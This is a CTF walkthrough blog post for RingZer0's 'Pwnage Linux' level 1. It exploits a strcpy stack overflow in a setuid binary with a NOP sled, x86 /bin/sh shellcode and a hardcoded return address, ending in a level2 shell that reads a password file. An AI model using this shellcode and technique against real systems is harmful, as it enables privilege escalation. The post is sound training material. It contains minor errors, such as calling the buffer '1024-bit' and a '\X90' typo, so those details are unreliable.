---
title: "R0 | Pwnage Linux - Level1"
layout: post
date: 2019-08-10
tag:
- Pwnage
- x86
- Linux
- walktrhough
- CTF 
category: blog
author: Srbx7
description: R0 | Pwnage Linux - Level1
---

`# cat /levels/level1.c`

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {

    char buf[1024];

    strcpy(buf, argv[1]);
    return 0;
}
```

This code's copying the argument to a 1024-bit buffer using the well known vulnerable function `strcpy`.


`# file /levels/level1`

```
level1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=f355fe3b2ac64ecfedfcf48c6208429d0138e80d, not stripped
```

> Has a setuid (probably for the next level.. )

> Is compiled for 32 processors (e.g.: x86 arch)

`# checksec /levels/level1`

```
[*] '/root/ringzer0team/pwnageLinux/level1/a.out'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

> No RELRO (Relocation Read-Only): it's possible to overwrite global variable

> No canary found: it's possible to smash the stack 

> NX (no executable) disabled: it's possible to write and execute from the stack

> No PIE (Position Independant Executable): it tells the loader which virtual address it should use and keeps its memory layout quite static (e.g.: `0x8048000`)

So, basically, what you have to do is overflow the 1024-bit buffer to return to an address on the stack where's an x86 shellcode that generates a shell. Let's hope that the user will be level 2 and have launched this ELF using the `setuid`.

1. Find the offset of the return adress

```python
from pwn import *
cyclic(2000)
```

``` bash
(gdb) run <CYCLIC_PL>
Program received signal SIGSEGV, Segmentation fault.
0x6b61616a in ?? ()
```

```python
cyclic_find(0x6b61616a)
1036
```
2. Get a x86 shellcode

```python
 len("\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")
45
```

3. Pick the return address

```bash
(gdb) run `python -c 'print "A" * 1040'`
(gdb) x/100wx $esp-1050
0xffffd456:	0x0048ffff	0x00040000	0x41410000	0x41414141
0xffffd466:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd476:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd486:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd496:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd4a6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd4b6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd4c6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd4d6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd4e6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd4f6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd506:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd516:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd526:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd536:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd546:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd556:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd566:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd576:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd586:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd596:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5a6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5b6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5c6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5d6:	0x41414141	0x41414141	0x41414141	0x41414141
```

4. Craft the PL (e.g.: NOP + SHELLCODE + RETURNADRESS)

```bash
/levels/level1 `python -c 'print "\X90" * 1036-45 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xb6\xd5\xff\xff"'`
```

That's it!

```
level1@lxc-pwn-x86:~$ /levels/level1 `python -c 'print "\x90" * (1036-45) + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xb6\xd5\xff\xff"'`
level2@lxc-pwn-x86:/home/level1$ wc /home/level2/.pass
 1  1 21 /home/level2/.pass
level2@lxc-pwn-x86:/home/level1$
```
